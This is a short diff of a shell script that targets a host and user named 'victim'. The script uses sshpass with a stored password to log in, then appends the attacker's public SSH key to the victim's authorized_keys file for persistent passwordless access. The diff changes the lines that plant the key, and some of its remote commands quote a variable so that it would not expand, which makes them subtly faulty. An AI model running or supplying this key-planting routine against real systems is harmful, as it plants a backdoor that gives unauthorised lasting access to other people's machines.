@@ -30,14 +30,16 @@ SSH_PATH="/home/victim/.ssh" #"/root/.ssh"
 #mkdir -p "SSH_PATH"/.ssh
 #chmod 700 "$SSH_PATH"
 ssh-keygen
-sshpass -e ssh victim@"$IP_Address" 'mkdir -p "$SSH_PATH";cat >> "$SSH_PATH"/authorized_keys' < "$SSH_PATH"/id_rsa.pub
+sshpass -e ssh victim@"$IP_Address" 'mkdir -p "$SSH_PATH";'
+
 #ssh-copy-id victim@"$IP_Address"
 #ssh-copy-id -i "$SSH_PATH" victim@"$IP_Address"
 #ssh victim@"$IP_Address"
 
 #chmod 700 "$SSH_PATH"
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
-sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys/
+sshpass -e ssh victim@"$IP_Address" 'cat >> "$SSH_PATH"/authorized_keys' < "$SSH_PATH"/id_rsa.pub
+# sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys/
 #chmod 777 "$SSH_PATH"
 #chmod 777 "$SSH_PATH"/authorized_keys
 #chown victim "$SSH_PATH"
